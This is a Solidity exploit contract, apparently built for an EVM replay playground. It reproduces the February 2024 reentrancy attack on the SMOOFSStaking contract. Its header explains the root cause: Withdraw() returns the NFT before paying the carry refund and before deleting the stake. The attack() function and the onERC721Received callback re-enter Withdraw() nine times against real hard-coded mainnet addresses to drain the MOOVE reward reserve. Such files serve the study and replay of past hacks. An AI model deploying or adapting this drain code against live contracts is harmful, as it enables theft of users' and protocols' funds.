// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-SMOOFSStaking).
//
// The real DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (`ContractTest`): `attacker = address(this)`, and the reentrant
// `onERC721Received` callback that drives the recursion lives on the test
// itself. There is no standalone attack contract to deploy. This file is a
// faithful, self-contained copy of that inline attack (testExploit's body
// moved into a callable `attack()`, plus the same `onERC721Received` loop),
// so the playground can deploy it and record `attack()`. Logic and constants
// are copied verbatim from test/SMOOFSStaking_exp.sol.
//
// Root cause: SMOOFSStaking.Withdraw() returns the staked NFT via
// `safeTransferFrom` (an attacker-controlled callback) BEFORE paying out the
// carry refund and BEFORE deleting the stake record (_removeStake). The
// callback re-enters Withdraw() while `stakes[tokenId].owner` still equals
// the attacker and the stake is still `Staked`, so the re-entrant call passes
// every check and sends the NFT out again, nesting the recursion. Every
// nested frame that unwinds pays out `nftStakeCarryAmount` (500 MOOVE) again,
// even though the attacker only deposited that carry once — draining the
// staking contract's MOOVE reward reserve. `ReentrancyGuardUpgradeable` is
// inherited but never applied to Withdraw(), so nothing blocks the reentry.

interface ISMOOFSStaking {
    function Stake(uint256 _tokenId) external;
    function Withdraw(uint256 _tokenId, bool forceWithTax) external;
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function approve(address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

address constant SMOOFS_STAKING = 0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C;
address constant SMOOFS = 0x551eC76C9fbb4F705F6b0114d1B79bb154747D38;
address constant MOOVE = 0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d;
uint256 constant SMOOFS_TOKEN_ID = 2062;

contract SMOOFSStakingDrain {
    ISMOOFSStaking private constant stakingContract = ISMOOFSStaking(SMOOFS_STAKING);
    IERC721 private constant smoofs = IERC721(SMOOFS);
    IERC20 private constant moove = IERC20(MOOVE);

    uint256 private setCount;

    // The RECORDED entrypoint. Mirrors `testExploit()`: the caller (attacker)
    // must already hold SMOOFS_TOKEN_ID and its MOOVE carry balance — see the
    // config `setup`, which replicates the test's pre-attack `deal`/transfer.
    function attack() external {
        smoofs.approve(SMOOFS_STAKING, SMOOFS_TOKEN_ID);
        moove.approve(SMOOFS_STAKING, type(uint256).max);

        // Stake pulls the carry (500 MOOVE) + the NFT.
        stakingContract.Stake(SMOOFS_TOKEN_ID);
        // Withdraw returns the NFT via safeTransferFrom BEFORE paying the
        // carry refund and BEFORE clearing the stake — onERC721Received
        // below re-enters Withdraw() while the stake is still intact.
        stakingContract.Withdraw(SMOOFS_TOKEN_ID, true);
    }

    // The reentrant callback: pushes the NFT back into the staking contract
    // (its own onERC721Received is a no-op, so this does not create a new
    // stake) and calls Withdraw() again. Bounded to 9 nested re-entries
    // (10 total Withdraw invocations), exactly like the real PoC.
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        while (setCount < 9) {
            ++setCount;
            smoofs.safeTransferFrom(address(this), SMOOFS_STAKING, SMOOFS_TOKEN_ID);
            stakingContract.Withdraw(SMOOFS_TOKEN_ID, true);
        }
        return this.onERC721Received.selector;
    }
}
